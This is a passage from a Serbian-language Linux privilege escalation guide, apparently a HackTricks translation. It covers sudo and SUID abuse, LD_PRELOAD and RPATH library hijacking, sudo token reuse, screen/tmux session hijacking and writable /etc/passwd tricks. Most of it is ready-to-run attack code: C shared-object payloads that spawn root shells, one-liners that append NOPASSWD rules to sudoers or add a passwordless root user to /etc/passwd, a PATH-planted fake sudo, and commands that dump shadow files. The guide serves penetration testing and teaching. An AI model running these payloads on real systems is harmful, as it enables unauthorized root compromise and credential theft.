Ako ustanovite da možete da koristite komandu **`ctr`**, pročitajte sledeću stranicu jer **you may be able to abuse it to escalate privileges**:


{{#ref}}
containerd-ctr-privilege-escalation.md
{{#endref}}

## **RunC** privilege escalation

Ako ustanovite da možete da koristite komandu **`runc`**, pročitajte sledeću stranicu jer **you may be able to abuse it to escalate privileges**:


{{#ref}}
runc-privilege-escalation.md
{{#endref}}

## **D-Bus**

D-Bus je složen sistem za **inter-Process Communication (IPC)** koji omogućava aplikacijama da efikasno komuniciraju i dele podatke. Dizajniran za moderne Linux sisteme, nudi robustan okvir za različite oblike komunikacije između aplikacija.

Sistem je svestran, podržava osnovni IPC koji unapređuje razmenu podataka između procesa, podsećajući na **enhanced UNIX domain sockets**. Pored toga, pomaže u emitovanju događaja ili signala, olakšavajući besprekornu integraciju među komponentama sistema. Na primer, signal iz Bluetooth daemona o dolazećem pozivu može naterati plejer muzike da utiša zvuk, poboljšavajući korisničko iskustvo. Takođe, D-Bus podržava sistem udaljenih objekata (remote object system), pojednostavljujući zahteve za servisima i pozive metoda između aplikacija, ubrzavajući procese koji su ranije bili komplikovani.

D-Bus radi po modelu **allow/deny**, upravljajući dozvolama poruka (pozivi metoda, emitovanje signala, itd.) na osnovu kumulativnog efekta podudarnih pravila politike. Ove politike specificiraju interakcije sa bus-om, potencijalno omogućavajući privilege escalation kroz zloupotrebu ovih dozvola.

Dat je primer takve politike u `/etc/dbus-1/system.d/wpa_supplicant.conf`, koji detaljno opisuje dozvole za root korisnika da poseduje, šalje i prima poruke od `fi.w1.wpa_supplicant1`.

Politike bez specificiranog korisnika ili grupe važe univerzalno, dok "default" kontekst politike važe za sve koji nisu obuhvaćeni drugim specifičnim politikama.
```xml
<policy user="root">
<allow own="fi.w1.wpa_supplicant1"/>
<allow send_destination="fi.w1.wpa_supplicant1"/>
<allow send_interface="fi.w1.wpa_supplicant1"/>
<allow receive_sender="fi.w1.wpa_supplicant1" receive_type="signal"/>
</policy>
```
**Naučite kako da enumerate and exploit a D-Bus communication ovde:**


{{#ref}}
d-bus-enumeration-and-command-injection-privilege-escalation.md
{{#endref}}

## **Network**

Uvek je interesantno enumerate the network i utvrditi poziciju mašine.

### Generic enumeration
```bash
#Hostname, hosts and DNS
cat /etc/hostname /etc/hosts /etc/resolv.conf
dnsdomainname

#Content of /etc/inetd.conf & /etc/xinetd.conf
cat /etc/inetd.conf /etc/xinetd.conf

#Interfaces
cat /etc/networks
(ifconfig || ip a)

#Neighbours
(arp -e || arp -a)
(route || ip n)

#Iptables rules
(timeout 1 iptables -L 2>/dev/null; cat /etc/iptables/* | grep -v "^#" | grep -Pv "\W*\#" 2>/dev/null)

#Files used by network services
lsof -i
```
### Otvoreni portovi

Uvek proverite mrežne servise koji rade na mašini sa kojom niste mogli da komunicirate pre nego što ste joj pristupili:
```bash
(netstat -punta || ss --ntpu)
(netstat -punta || ss --ntpu) | grep "127.0"
```
### Sniffing

Proverite da li možete sniff saobraćaj. Ako možete, mogli biste dohvatiti neke credentials.
```
timeout 1 tcpdump
```
## Korisnici

### Generička enumeracija

Proverite **ko** ste, koje **privilegije** imate, koji **korisnici** su u sistemu, koji mogu da se **prijave** i koji imaju **root privilegije**:
```bash
#Info about me
id || (whoami && groups) 2>/dev/null
#List all users
cat /etc/passwd | cut -d: -f1
#List users with console
cat /etc/passwd | grep "sh$"
#List superusers
awk -F: '($3 == "0") {print}' /etc/passwd
#Currently logged users
w
#Login history
last | tail
#Last log of each user
lastlog

#List all users and their groups
for i in $(cut -d":" -f1 /etc/passwd 2>/dev/null);do id $i;done 2>/dev/null | sort
#Current user PGP keys
gpg --list-keys 2>/dev/null
```
### Veliki UID

Neke verzije Linuxa su bile pogođene bagom koji omogućava korisnicima sa **UID > INT_MAX** da eskaliraju privilegije. Više informacija: [ovde](https://gitlab.freedesktop.org/polkit/polkit/issues/74), [ovde](https://github.com/mirchr/security-research/blob/master/vulnerabilities/CVE-2018-19788.sh) i [ovde](https://twitter.com/paragonsec/status/1071152249529884674).\
**Iskoristite to** pomoću: **`systemd-run -t /bin/bash`**

### Grupe

Proverite da li ste **član neke grupe** koja bi vam mogla dodeliti root privilegije:


{{#ref}}
interesting-groups-linux-pe/
{{#endref}}

### Međuspremnik

Proverite da li se nešto zanimljivo nalazi u međuspremniku (ako je moguće)
```bash
if [ `which xclip 2>/dev/null` ]; then
echo "Clipboard: "`xclip -o -selection clipboard 2>/dev/null`
echo "Highlighted text: "`xclip -o 2>/dev/null`
elif [ `which xsel 2>/dev/null` ]; then
echo "Clipboard: "`xsel -ob 2>/dev/null`
echo "Highlighted text: "`xsel -o 2>/dev/null`
else echo "Not found xsel and xclip"
fi
```
### Politika lozinki
```bash
grep "^PASS_MAX_DAYS\|^PASS_MIN_DAYS\|^PASS_WARN_AGE\|^ENCRYPT_METHOD" /etc/login.defs
```
### Poznate lozinke

Ako **poznajete bilo koju lozinku** u okruženju, **pokušajte da se prijavite kao svaki korisnik** koristeći tu lozinku.

### Su Brute

Ako vam ne smeta da napravite puno buke i `su` i `timeout` binari su prisutni na računaru, možete pokušati da brute-force-ujete korisnika koristeći [su-bruteforce](https://github.com/carlospolop/su-bruteforce).\
[**Linpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) sa `-a` parametrom takođe pokušava da brute-force-uje korisnike.

## Zloupotrebe upisivog $PATH-a

### $PATH

Ako otkrijete da možete **pisati u neki direktorij iz $PATH**, možda ćete moći da escalate privileges kreiranjem backdoor-a unutar upisivog direktorijuma sa imenom neke komande koja će biti izvršena od strane drugog korisnika (idealno root) i koja **nije učitana iz direktorijuma koji se nalazi pre** vašeg upisivog direktorijuma u $PATH.

### SUDO and SUID

Možda vam je dozvoljeno da izvršite neku komandu koristeći sudo ili komande mogu imati suid bit. Proverite to koristeći:
```bash
sudo -l #Check commands you can execute with sudo
find / -perm -4000 2>/dev/null #Find all SUID binaries
```
Neke **neočekivane komande vam omogućavaju da čitate i/ili pišete fajlove ili čak izvršite komandu.** Na primer:
```bash
sudo awk 'BEGIN {system("/bin/sh")}'
sudo find /etc -exec sh -i \;
sudo tcpdump -n -i lo -G1 -w /dev/null -z ./runme.sh
sudo tar c a.tar -I ./runme.sh a
ftp>!/bin/sh
less>! <shell_comand>
```
### NOPASSWD

Sudo konfiguracija može omogućiti korisniku da izvrši neku komandu sa privilegijama drugog korisnika bez poznavanja lozinke.
```
$ sudo -l
User demo may run the following commands on crashlab:
(root) NOPASSWD: /usr/bin/vim
```
U ovom primeru, korisnik `demo` može da pokrene `vim` kao `root`; sada je trivijalno dobiti shell dodavanjem ssh ključa u root direktorijum ili pozivanjem `sh`.
```
sudo vim -c '!sh'
```
### SETENV

Ova direktiva omogućava korisniku da **postavi promenljivu okruženja** prilikom izvršavanja nečega:
```bash
$ sudo -l
User waldo may run the following commands on admirer:
(ALL) SETENV: /opt/scripts/admin_tasks.sh
```
Ovaj primer, **zasnovan na HTB machine Admirer**, bio je **ranjiv** na **PYTHONPATH hijacking** koji omogućava učitavanje proizvoljne python biblioteke dok se skripta izvršava kao root:
```bash
sudo PYTHONPATH=/dev/shm/ /opt/scripts/admin_tasks.sh
```
### BASH_ENV sačuvan preko sudo env_keep → root shell

Ako sudoers sačuva `BASH_ENV` (npr. `Defaults env_keep+="ENV BASH_ENV"`), možeš iskoristiti Bash-ovo neinteraktivno ponašanje pri pokretanju da pokreneš proizvoljan kod kao root pri izvršavanju dozvoljene komande.

- Zašto radi: Za neinteraktivne shelove, Bash evaluira `$BASH_ENV` i izvršava sadržaj datog fajla (sourcing) pre pokretanja ciljnog skripta. Mnogi sudo pravilnici dozvoljavaju pokretanje skripta ili shell wrapper-a. Ako `BASH_ENV` bude sačuvan od strane sudo, tvoj fajl će biti izvršen sa root privilegijama.

- Zahtevi:
- Sudo pravilo koje možeš pokrenuti (bilo koji target koji poziva `/bin/bash` neinteraktivno, ili bilo koji bash skript).
- `BASH_ENV` prisutan u `env_keep` (proveri sa `sudo -l`).

- PoC:
```bash
cat > /dev/shm/shell.sh <<'EOF'
#!/bin/bash
/bin/bash
EOF
chmod +x /dev/shm/shell.sh
BASH_ENV=/dev/shm/shell.sh sudo /usr/bin/systeminfo   # or any permitted script/binary that triggers bash
# You should now have a root shell
```
- Ojačavanje:
- Uklonite `BASH_ENV` (i `ENV`) iz `env_keep`; koristite `env_reset`.
- Izbegavajte shell wrappers za sudo-allowed commands; koristite minimalne binaries.
- Razmotrite sudo I/O logging i alerting kada se preserved env vars koriste.

### Putanje za zaobilaženje sudo izvršavanja

**Jump** da pročitate druge fajlove ili koristite **symlinks**. Na primer, u sudoers fajlu: _hacker10 ALL= (root) /bin/less /var/log/\*_
```bash
sudo less /var/logs/anything
less>:e /etc/shadow #Jump to read other files using privileged less
```

```bash
ln /etc/shadow /var/log/new
sudo less /var/log/new #Use symlinks to read any file
```
Ako se koristi **wildcard** (\*), to je još lakše:
```bash
sudo less /var/log/../../etc/shadow #Read shadow
sudo less /var/log/something /etc/shadow #Red 2 files
```
**Protivmere**: [https://blog.compass-security.com/2012/10/dangerous-sudoers-entries-part-5-recapitulation/](https://blog.compass-security.com/2012/10/dangerous-sudoers-entries-part-5-recapitulation/)

### Sudo command/SUID binary bez putanje do komande

Ako je **sudo permission** dodeljena jednoj komandi **bez navođenja putanje**: _hacker10 ALL= (root) less_ možete to iskoristiti promenom promenljive PATH.
```bash
export PATH=/tmp:$PATH
#Put your backdoor in /tmp and name it "less"
sudo less
```
Ova tehnika se takođe može koristiti ako **suid** binary **izvršava drugu komandu bez navođenja putanje do nje (uvek proverite pomoću** _**strings**_ **sadržaj čudnog SUID binary)**.

[Payload examples to execute.](payloads-to-execute.md)

### SUID binary sa putanjom komande

Ako **suid** binary **izvršava drugu komandu navodeći putanju**, možete pokušati da **export a function** koja se zove kao komanda koju suid fajl poziva.

Na primer, ako suid binary poziva _**/usr/sbin/service apache2 start**_, treba da pokušate da kreirate funkciju i export-ujete je:
```bash
function /usr/sbin/service() { cp /bin/bash /tmp && chmod +s /tmp/bash && /tmp/bash -p; }
export -f /usr/sbin/service
```
Zatim, kada pozovete suid binarni fajl, ova funkcija će biti izvršena

### LD_PRELOAD & **LD_LIBRARY_PATH**

The **LD_PRELOAD** environment variable is used to specify one or more shared libraries (.so files) to be loaded by the loader before all others, including the standard C library (`libc.so`). This process is known as preloading a library.

Međutim, kako bi se održala bezbednost sistema i sprečilo zloupotrebljavanje ove funkcije, naročito kod **suid/sgid** izvršnih fajlova, sistem nameće određene uslove:

- The loader disregards **LD_PRELOAD** for executables where the real user ID (_ruid_) does not match the effective user ID (_euid_).
- For executables with suid/sgid, only libraries in standard paths that are also suid/sgid are preloaded.

Eskalacija privilegija može se dogoditi ako imate mogućnost da izvršavate komande sa `sudo` i izlaz `sudo -l` uključuje izraz **env_keep+=LD_PRELOAD**. Ova konfiguracija dozvoljava da promenljiva okruženja **LD_PRELOAD** opstane i bude prepoznata čak i kada se komande pokreću sa `sudo`, što potencijalno može dovesti do izvršavanja proizvoljnog koda sa povišenim privilegijama.
```
Defaults        env_keep += LD_PRELOAD
```
Sačuvajte kao **/tmp/pe.c**
```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
unsetenv("LD_PRELOAD");
setgid(0);
setuid(0);
system("/bin/bash");
}
```
Zatim **kompajlirajte ga** koristeći:
```bash
cd /tmp
gcc -fPIC -shared -o pe.so pe.c -nostartfiles
```
Na kraju, **escalate privileges** pokretanjem
```bash
sudo LD_PRELOAD=./pe.so <COMMAND> #Use any command you can run with sudo
```
> [!CAUTION]
> Sličan privesc može biti zloupotrebljen ako napadač kontroliše **LD_LIBRARY_PATH** env variable, pošto time kontroliše putanju u kojoj će se tražiti biblioteke.
```c
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
unsetenv("LD_LIBRARY_PATH");
setresuid(0,0,0);
system("/bin/bash -p");
}
```

```bash
# Compile & execute
cd /tmp
gcc -o /tmp/libcrypt.so.1 -shared -fPIC /home/user/tools/sudo/library_path.c
sudo LD_LIBRARY_PATH=/tmp <COMMAND>
```
### SUID Binary – .so injection

Kada naiđete na binary sa **SUID** permisijama koji deluje neobično, dobro je proveriti da li pravilno učitava **.so** fajlove. Ovo se može proveriti pokretanjem sledeće komande:
```bash
strace <SUID-BINARY> 2>&1 | grep -i -E "open|access|no such file"
```
Na primer, nailazak na grešku kao _"open(“/path/to/.config/libcalc.so”, O_RDONLY) = -1 ENOENT (No such file or directory)"_ ukazuje na potencijal za eksploataciju.

Da biste to iskoristili, treba kreirati C fajl, npr. _"/path/to/.config/libcalc.c"_, koji sadrži sledeći kod:
```c
#include <stdio.h>
#include <stdlib.h>

static void inject() __attribute__((constructor));

void inject(){
system("cp /bin/bash /tmp/bash && chmod +s /tmp/bash && /tmp/bash -p");
}
```
Ovaj kod, kada se kompajlira i izvrši, ima za cilj eskalaciju privilegija manipulisanjem dozvola fajlova i pokretanjem shell-a sa povišenim privilegijama.

Kompajlirajte gore navedeni C file u shared object (.so) file sa:
```bash
gcc -shared -o /path/to/.config/libcalc.so -fPIC /path/to/.config/libcalc.c
```
Na kraju, pokretanje pogođenog SUID binary trebalo bi da okine exploit, omogućavajući potencijalni system compromise.

## Shared Object Hijacking
```bash
# Lets find a SUID using a non-standard library
ldd some_suid
something.so => /lib/x86_64-linux-gnu/something.so

# The SUID also loads libraries from a custom location where we can write
readelf -d payroll  | grep PATH
0x000000000000001d (RUNPATH)            Library runpath: [/development]
```
Sada kada smo pronašli SUID binarni fajl koji učitava biblioteku iz direktorijuma u koji možemo pisati, kreirajmo biblioteku u tom direktorijumu sa odgovarajućim imenom:
```c
//gcc src.c -fPIC -shared -o /development/libshared.so
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
setresuid(0,0,0);
system("/bin/bash -p");
}
```
Ako dobijete grešku kao što je
```shell-session
./suid_bin: symbol lookup error: ./suid_bin: undefined symbol: a_function_name
```
to znači da biblioteka koju ste generisali mora da ima funkciju pod nazivom `a_function_name`.

### GTFOBins

[**GTFOBins**](https://gtfobins.github.io) je kurirana lista Unix binarnih fajlova koje napadač može iskoristiti da zaobiđe lokalna bezbednosna ograničenja. [**GTFOArgs**](https://gtfoargs.github.io/) je isto, ali za slučajeve kada možete **only inject arguments** u komandu.

Projekat prikuplja legitimne funkcije Unix binarnih fajlova koje se mogu zloupotrebiti za izlazak iz ograničenih shell-ova, eskalaciju ili održavanje povišenih privilegija, transfer fajlova, spawn bind and reverse shells, i olakšavanje drugih post-exploitation tasks.

> gdb -nx -ex '!sh' -ex quit\
> sudo mysql -e '! /bin/sh'\
> strace -o /dev/null /bin/sh\
> sudo awk 'BEGIN {system("/bin/sh")}'


{{#ref}}
https://gtfobins.github.io/
{{#endref}}


{{#ref}}
https://gtfoargs.github.io/
{{#endref}}

### FallOfSudo

Ako možete da pokrenete `sudo -l`, možete koristiti alat [**FallOfSudo**](https://github.com/CyberOne-Security/FallofSudo) da proverite da li pronalazi način kako da iskoristi bilo koje sudo pravilo.

### Ponovno korišćenje sudo tokena

U slučajevima kada imate **sudo access** ali ne i lozinku, možete eskalirati privilegije čekanjem izvršenja sudo komande i potom hijack-ovanjem session token-a.

Zahtevi za eskalaciju privilegija:

- Već imate shell kao korisnik "_sampleuser_"
- "_sampleuser_" je **koristio `sudo`** da izvrši nešto u **poslednjih 15 minuta** (po defaultu to je trajanje sudo tokena koje nam omogućava da koristimo `sudo` bez unošenja lozinke)
- `cat /proc/sys/kernel/yama/ptrace_scope` je 0
- `gdb` je dostupan (možete ga otpremiti)

(Možete privremeno omogućiti `ptrace_scope` sa `echo 0 | sudo tee /proc/sys/kernel/yama/ptrace_scope` ili trajno menjajući `/etc/sysctl.d/10-ptrace.conf` i postavljajući `kernel.yama.ptrace_scope = 0`)

Ako su svi ovi uslovi ispunjeni, **možete eskalirati privilegije koristeći:** [**https://github.com/nongiach/sudo_inject**](https://github.com/nongiach/sudo_inject)

- The **first exploit** (`exploit.sh`) će kreirati binarni fajl `activate_sudo_token` u _/tmp_. Možete ga koristiti da **aktivirate sudo token u vašoj sesiji** (nećete automatski dobiti root shell, uradite `sudo su`):
```bash
bash exploit.sh
/tmp/activate_sudo_token
sudo su
```
- **drugi exploit** (`exploit_v2.sh`) će kreirati sh shell u _/tmp_ **u vlasništvu root-a sa setuid**
```bash
bash exploit_v2.sh
/tmp/sh -p
```
- **treći exploit** (`exploit_v3.sh`) će **kreirati sudoers file** koji čini **sudo tokens večnim i omogućava svim korisnicima da koriste sudo**
```bash
bash exploit_v3.sh
sudo su
```
### /var/run/sudo/ts/\<Username>

Ako imate **write permissions** u direktorijumu ili na bilo kojoj od datoteka kreiranih u tom direktorijumu, možete koristiti binarni alat [**write_sudo_token**](https://github.com/nongiach/sudo_inject/tree/master/extra_tools) da **kreirate sudo token za korisnika i PID**.\
Na primer, ako možete overwrite fajl _/var/run/sudo/ts/sampleuser_ i imate shell kao taj korisnik sa PID 1234, možete **dobiti sudo privilegije** bez potrebe da znate lozinku izvršavanjem:
```bash
./write_sudo_token 1234 > /var/run/sudo/ts/sampleuser
```
### /etc/sudoers, /etc/sudoers.d

Datoteka `/etc/sudoers` i datoteke unutar `/etc/sudoers.d` podešavaju ko može da koristi `sudo` i kako. Ove datoteke **po podrazumevanoj postavci mogu se čitati samo od strane korisnika root i grupe root**.\
**Ako** možete da **pročitate** ovu datoteku, mogli biste biti u mogućnosti da **dobijete neke interesantne informacije**, a ako možete da **pišete** bilo koju datoteku, moći ćete da **escalate privileges**.
```bash
ls -l /etc/sudoers /etc/sudoers.d/
ls -ld /etc/sudoers.d/
```
Ako možeš da pišeš, možeš da zloupotrebiš ovu dozvolu
```bash
echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers
echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers.d/README
```
Drugi način zloupotrebe ovih dozvola:
```bash
# makes it so every terminal can sudo
echo "Defaults !tty_tickets" > /etc/sudoers.d/win
# makes it so sudo never times out
echo "Defaults timestamp_timeout=-1" >> /etc/sudoers.d/win
```
### DOAS

Postoje neke alternative za binarni fajl `sudo`, kao što je `doas` za OpenBSD. Ne zaboravite da proverite njegovu konfiguraciju u `/etc/doas.conf`
```
permit nopass demo as root cmd vim
```
### Sudo Hijacking

Ako znate da **korisnik obično povezuje na mašinu i koristi `sudo`** da eskalira privilegije i da ste dobili shell u kontekstu tog korisnika, možete **napraviti novi sudo izvršni fajl** koji će izvršiti vaš kod kao root, a zatim korisnikovu komandu. Zatim, **izmenite $PATH** u kontekstu korisnika (na primer dodavanjem novog puta u .bash_profile) tako da kada korisnik pokrene sudo, izvrši se vaš sudo izvršni fajl.

Imajte na umu da ako korisnik koristi drugi shell (ne bash), biće potrebno izmeniti druge fajlove da biste dodali novi put. Na primer[ sudo-piggyback](https://github.com/APTy/sudo-piggyback) menja `~/.bashrc`, `~/.zshrc`, `~/.bash_profile`. Možete pronaći još jedan primer u [bashdoor.py](https://github.com/n00py/pOSt-eX/blob/master/empire_modules/bashdoor.py)

Ili pokretanjem nečega poput:
```bash
cat >/tmp/sudo <<EOF
#!/bin/bash
/usr/bin/sudo whoami > /tmp/privesc
/usr/bin/sudo "\$@"
EOF
chmod +x /tmp/sudo
echo ‘export PATH=/tmp:$PATH’ >> $HOME/.zshenv # or ".bashrc" or any other

# From the victim
zsh
echo $PATH
sudo ls
```
## Deljena biblioteka

### ld.so

Datoteka `/etc/ld.so.conf` ukazuje **odakle dolaze učitane konfiguracione datoteke**. Tipično, ova datoteka sadrži sledeći put: `include /etc/ld.so.conf.d/*.conf`

To znači da će se pročitati konfiguracione datoteke iz `/etc/ld.so.conf.d/*.conf`. Ove konfiguracione datoteke **pokazuju na druge foldere** u kojima će se **pretraživati** **biblioteke**. Na primer, sadržaj `/etc/ld.so.conf.d/libc.conf` je `/usr/local/lib`. **To znači da će sistem tražiti biblioteke unutar `/usr/local/lib`**.

Ako iz nekog razloga **korisnik ima write permissions** na bilo kom od navedenih puteva: `/etc/ld.so.conf`, `/etc/ld.so.conf.d/`, bilo kojoj datoteci unutar `/etc/ld.so.conf.d/` ili bilo kojem folderu navedenom u konfiguracionoj datoteci `/etc/ld.so.conf.d/*.conf`, on može da escalate privileges.\
Pogledajte **how to exploit this misconfiguration** na sledećoj stranici:

{{#ref}}
ld.so.conf-example.md
{{#endref}}

### RPATH
```
level15@nebula:/home/flag15$ readelf -d flag15 | egrep "NEEDED|RPATH"
0x00000001 (NEEDED)                     Shared library: [libc.so.6]
0x0000000f (RPATH)                      Library rpath: [/var/tmp/flag15]

level15@nebula:/home/flag15$ ldd ./flag15
linux-gate.so.1 =>  (0x0068c000)
libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0x00110000)
/lib/ld-linux.so.2 (0x005bb000)
```
Ako se lib kopira u `/var/tmp/flag15/`, program će ga koristiti na ovom mestu, kako je navedeno u promenljivoj `RPATH`.
```
level15@nebula:/home/flag15$ cp /lib/i386-linux-gnu/libc.so.6 /var/tmp/flag15/

level15@nebula:/home/flag15$ ldd ./flag15
linux-gate.so.1 =>  (0x005b0000)
libc.so.6 => /var/tmp/flag15/libc.so.6 (0x00110000)
/lib/ld-linux.so.2 (0x00737000)
```
Zatim kreirajte zlonamernu biblioteku u `/var/tmp` pomoću `gcc -fPIC -shared -static-libgcc -Wl,--version-script=version,-Bstatic exploit.c -o libc.so.6`
```c
#include<stdlib.h>
#define SHELL "/bin/sh"

int __libc_start_main(int (*main) (int, char **, char **), int argc, char ** ubp_av, void (*init) (void), void (*fini) (void), void (*rtld_fini) (void), void (* stack_end))
{
char *file = SHELL;
char *argv[] = {SHELL,0};
setresuid(geteuid(),geteuid(), geteuid());
execve(file,argv,0);
}
```
## Capabilities

Linux capabilities pružaju **podskup dostupnih root privileges procesu**. Ovo efektivno razlaže root **privileges na manje i jasno odvojene jedinice**. Svaka od ovih jedinica može biti nezavisno dodeljena procesima. Na ovaj način se smanjuje kompletan skup privileges, čime se umanjuje rizik od exploitation-a.\
Pročitajte sledeću stranicu da biste **saznali više o capabilities i kako ih zloupotrebiti**:


{{#ref}}
linux-capabilities.md
{{#endref}}

## Dozvole direktorijuma

U direktorijumu, **bit za "execute"** implicira da pogođeni korisnik može "**cd**" u folder.\
**"read"** bit implicira da korisnik može **list** **files**, a **"write"** bit implicira da korisnik može **delete** i **create** nove **files**.

## ACLs

Access Control Lists (ACLs) predstavljaju sekundarni sloj diskrecionih dozvola, sposoban da **overriding the traditional ugo/rwx permissions**. Ove dozvole poboljšavaju kontrolu pristupa fajlu ili direktorijumu dopuštajući ili uskraćujući prava određenim korisnicima koji nisu vlasnici niti članovi grupe. Ovaj nivo **granularnosti omogućava preciznije upravljanje pristupom**. Dalje detalje možete naći [**here**](https://linuxconfig.org/how-to-manage-acls-on-linux).

**Dodeli** korisniku "kali" read i write permissions nad fajlom:
```bash
setfacl -m u:kali:rw file.txt
#Set it in /etc/sudoers or /etc/sudoers.d/README (if the dir is included)

setfacl -b file.txt #Remove the ACL of the file
```
**Nabavi** datoteke sa specifičnim ACL-ovima iz sistema:
```bash
getfacl -t -s -R -p /bin /etc /home /opt /root /sbin /usr /tmp 2>/dev/null
```
## Otvorene shell sessions

U **starim verzijama** možete **hijack** neku **shell** session drugog korisnika (**root**).\
U **najnovijim verzijama** moći ćete da **connect** na screen sessions samo **svog korisnika**. Međutim, možete pronaći **zanimljive informacije unutar session**.

### screen sessions hijacking

**List screen sessions**
```bash
screen -ls
screen -ls <username>/ # Show another user' screen sessions
```
![](<../../images/image (141).png>)

**Prikači se na sesiju**
```bash
screen -dr <session> #The -d is to detach whoever is attached to it
screen -dr 3350.foo #In the example of the image
screen -x [user]/[session id]
```
## tmux sessions hijacking

Ovo je bio problem sa **old tmux versions**. Nisam mogao da hijack-ujem tmux (v2.1) session kreiran od strane root-a dok sam bio neprivilegovan korisnik.

**Lista tmux sesija**
```bash
tmux ls
ps aux | grep tmux #Search for tmux consoles not using default folder for sockets
tmux -S /tmp/dev_sess ls #List using that socket, you can start a tmux session in that socket with: tmux -S /tmp/dev_sess
```
![](<../../images/image (837).png>)

**Priključi se na sesiju**
```bash
tmux attach -t myname #If you write something in this session it will appears in the other opened one
tmux attach -d -t myname #First detach the session from the other console and then access it yourself

ls -la /tmp/dev_sess #Check who can access it
rw-rw---- 1 root devs 0 Sep  1 06:27 /tmp/dev_sess #In this case root and devs can
# If you are root or devs you can access it
tmux -S /tmp/dev_sess attach -t 0 #Attach using a non-default tmux socket
```
Check **Valentine box from HTB** for an example.

## SSH

### Debian OpenSSL Predictable PRNG - CVE-2008-0166

All SSL and SSH keys generated on Debian based systems (Ubuntu, Kubuntu, etc) between September 2006 and May 13th, 2008 may be affected by this bug.\
Ovaj bug nastaje prilikom kreiranja novog ssh ključa na tim OS-ovima, jer je bilo moguće samo **32,768 variations**. To znači da se sve mogućnosti mogu izračunati i **posedujući ssh public key možete potražiti odgovarajući private key**. Možete pronaći izračunate mogućnosti ovde: [https://github.com/g0tmi1k/debian-ssh](https://github.com/g0tmi1k/debian-ssh)

### SSH Interesting configuration values

- **PasswordAuthentication:** Određuje da li je autentikacija lozinkom dozvoljena. Podrazumevano je `no`.
- **PubkeyAuthentication:** Određuje da li je autentikacija javnim ključem dozvoljena. Podrazumevano je `yes`.
- **PermitEmptyPasswords**: Kada je autentikacija lozinkom dozvoljena, određuje da li server dozvoljava prijavu na naloge sa praznim lozinkama. Podrazumevano je `no`.

### PermitRootLogin

Određuje da li root može da se prijavi koristeći ssh, podrazumevano je `no`. Moguće vrednosti:

- `yes`: root može da se prijavi koristeći lozinku i privatni ključ
- `without-password` or `prohibit-password`: root se može prijaviti samo privatnim ključem
- `forced-commands-only`: root se može prijaviti samo privatnim ključem i samo ako su specificirane opcije commands
- `no` : ne

### AuthorizedKeysFile

Određuje fajlove koji sadrže javne ključeve koji se mogu koristiti za autentikaciju korisnika. Može sadržati tokene poput `%h`, koji će biti zamenjeni home direktorijumom. **Možete navesti apsolutne putanje** (koje počinju sa `/`) ili **relativne putanje u odnosu na home korisnika**. For example:
```bash
AuthorizedKeysFile    .ssh/authorized_keys access
```
Ta konfiguracija će ukazati da, ako pokušate da se prijavite pomoću **private** key korisnika "**testusername**", ssh će uporediti public key vašeg ključa sa onima koji se nalaze u `/home/testusername/.ssh/authorized_keys` i `/home/testusername/access`

### ForwardAgent/AllowAgentForwarding

SSH agent forwarding vam omogućava da **use your local SSH keys instead of leaving keys** (without passphrases!) na vašem serveru. Tako ćete moći da **jump** putem ssh **to a host** i odatle **jump to another** host **using** the **key** koji se nalazi na vašem **initial host**.

Ovu opciju treba postaviti u `$HOME/.ssh.config` ovako:
```
Host example.com
ForwardAgent yes
```
Obratite pažnju da ako je `Host` `*`, svaki put kada korisnik pređe na drugi računar, taj host će moći da pristupi ključevima (što predstavlja bezbednosni problem).

Fajl `/etc/ssh_config` može **prepisati** ove **opcije** i dozvoliti ili zabraniti ovu konfiguraciju.\
Fajl `/etc/sshd_config` može **dozvoliti** ili **zabraniti** ssh-agent forwarding pomoću ključne reči `AllowAgentForwarding` (podrazumevano je dozvoljeno).

Ako otkrijete da je Forward Agent konfigurisan u okruženju, pročitajte sledeću stranicu jer **možda ćete moći da ga zloupotrebite za eskalaciju privilegija**:


{{#ref}}
ssh-forward-agent-exploitation.md
{{#endref}}

## Zanimljivi fajlovi

### Fajlovi profila

Fajl `/etc/profile` i fajlovi pod `/etc/profile.d/` su **skripte koje se izvršavaju kada korisnik pokrene novi shell**. Dakle, ako možete **pisati ili izmeniti bilo koji od njih, možete eskalirati privilegije**.
```bash
ls -l /etc/profile /etc/profile.d/
```
Ako se pronađe neka neobična skripta profila, treba je proveriti zbog **osetljivih informacija**.

### Passwd/Shadow datoteke

U zavisnosti od OS-a, `/etc/passwd` i `/etc/shadow` datoteke mogu imati drugačije ime ili može postojati backup. Zato se preporučuje da **pronađete sve datoteke** i **proverite da li možete da ih pročitate** kako biste videli **da li u njima postoje hashes**:
```bash
#Passwd equivalent files
cat /etc/passwd /etc/pwd.db /etc/master.passwd /etc/group 2>/dev/null
#Shadow equivalent files
cat /etc/shadow /etc/shadow- /etc/shadow~ /etc/gshadow /etc/gshadow- /etc/master.passwd /etc/spwd.db /etc/security/opasswd 2>/dev/null
```
U nekim slučajevima možete pronaći **password hashes** u `/etc/passwd` (ili u ekvivalentnoj datoteci).
```bash
grep -v '^[^:]*:[x\*]' /etc/passwd /etc/pwd.db /etc/master.passwd /etc/group 2>/dev/null
```
### /etc/passwd sa pravom za pisanje

Prvo, generišite lozinku pomoću jedne od sledećih komandi.
```
openssl passwd -1 -salt hacker hacker
mkpasswd -m SHA-512 hacker
python2 -c 'import crypt; print crypt.crypt("hacker", "$6$salt")'
```
Zatim dodajte korisnika `hacker` i postavite generisanu lozinku.
```
hacker:GENERATED_PASSWORD_HERE:0:0:Hacker:/root:/bin/bash
```
Npr: `hacker:$1$hacker$TzyKlv0/R/c28R.GAeLw.1:0:0:Hacker:/root:/bin/bash`

Sada možete koristiti komandu `su` sa `hacker:hacker`

Alternativno, možete koristiti sledeće linije da dodate lažnog korisnika bez lozinke.\
UPOZORENJE: možete narušiti trenutni nivo bezbednosti mašine.
```
echo 'dummy::0:0::/root:/bin/bash' >>/etc/passwd
su - dummy
```
NAPOMENA: Na BSD platformama `/etc/passwd` se nalazi na `/etc/pwd.db` i `/etc/master.passwd`, takođe `/etc/shadow` je preimenovan u `/etc/spwd.db`.

Trebalo bi da proverite da li možete **da pišete u neke osetljive fajlove**. Na primer, možete li da pišete u neki **konfiguracioni fajl servisa**?
```bash
